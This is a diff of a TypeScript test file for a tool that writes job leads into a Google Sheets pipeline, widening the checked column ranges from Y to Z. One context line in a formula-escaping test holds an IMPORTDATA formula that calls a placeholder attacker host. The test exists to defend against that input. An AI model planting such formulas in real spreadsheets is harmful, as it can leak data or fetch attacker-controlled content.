@@ -154,7 +154,7 @@ test("D4: fill-if-empty columns are filled when the user left them blank", async
   assert.equal(after[16], "LLM tp");
 });
 
-test("D2/D4: a merge writes only the cells that changed, never the whole A:Y row", async () => {
+test("D2/D4: a merge writes only the cells that changed, never the whole A:Z row", async () => {
   const url = "https://boards.greenhouse.io/acme/jobs/1";
   const sheet = createFakeSheets({ Pipeline: [HEADER, pipelineRow({ date: "2026-09-01", title: "Engineer", company: "Acme", location: "Remote", link: url, source: "Greenhouse", fit: "5", status: "Applied", notes: "keep" })] });
   const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
@@ -162,7 +162,7 @@ test("D2/D4: a merge writes only the cells that changed, never the whole A:Y row
   const update = sheet.calls.find((c) => c.kind === "values.batchUpdate");
   assert.ok(update, "the Fit Score change is written");
   const ranges: string[] = JSON.parse(update!.body).data.map((d: { range: string }) => d.range);
-  assert.deepEqual(ranges, ["Pipeline!H2"]);
+  assert.deepEqual(ranges, ["Pipeline!H2", "Pipeline!Z2"]);
 });
 
 test("D5: posting text that starts like a formula is written as text (p06)", async () => {
@@ -198,7 +198,7 @@ test("D5: a merged update escapes formula text too", async () => {
   assert.ok(values.includes("'=IMPORTDATA(\"https://attacker.invalid\")"));
 });
 
-test("D17: a write reads identity columns, not the full A2:Y range (p11)", async () => {
+test("D17: a write reads identity columns, not the full A2:Z range (p11)", async () => {
   const rows = [HEADER];
   for (let i = 0; i < 20; i += 1) {
     rows.push(pipelineRow({ title: `Old ${i}`, company: `Co${i}`, link: `https://old${i}.example/jobs/${i}`, notes: "x".repeat(200), fitAssessment: "y".repeat(400) }));
@@ -209,10 +209,10 @@ test("D17: a write reads identity columns, not the full A2:Y range (p11)", async
   const readRanges = sheet.calls
     .filter((c) => c.kind === "values.get" || c.kind === "values.batchGet")
     .flatMap((c) => (c.kind === "values.get" ? [c.range] : c.ranges));
-  assert.ok(!readRanges.includes("Pipeline!A2:Y"), `full-sheet read found: ${readRanges.join(" ")}`);
+  assert.ok(!readRanges.includes("Pipeline!A2:Z"), `full-sheet read found: ${readRanges.join(" ")}`);
   // Only the matched row is fetched in full.
-  const fullRowReads = readRanges.filter((r) => /^Pipeline!A\d+:Y\d+$/.test(r) && r !== "Pipeline!A1:Y1");
-  assert.deepEqual(fullRowReads, ["Pipeline!A5:Y5"]);
+  const fullRowReads = readRanges.filter((r) => /^Pipeline!A\d+:Z\d+$/.test(r) && r !== "Pipeline!A1:Z1");
+  assert.deepEqual(fullRowReads, ["Pipeline!A5:Z5"]);
 });
 
 test("D12: a failed update phase still appends brand-new leads (p12-1)", async () => {
